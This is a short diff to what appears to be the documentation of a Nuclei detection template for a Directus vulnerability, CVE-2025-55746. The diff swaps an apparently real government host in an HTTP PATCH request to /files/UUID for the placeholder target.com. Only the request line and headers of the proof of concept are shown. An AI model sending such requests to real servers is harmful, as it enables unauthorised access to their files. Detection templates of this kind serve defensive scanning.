@@ -4,7 +4,7 @@ Nuclei template to detect unauthenticated user information disclosure on Directu
 # POC FOR CVE-2025-55746
 ```
 PATCH /files/UUID HTTP/1.1
-Host: cms.nea.gov.sg
+Host: target.com
 Content-Type: multipart/form-data; boundary=----Boundary
 Content-Length: 342
 Connection: close
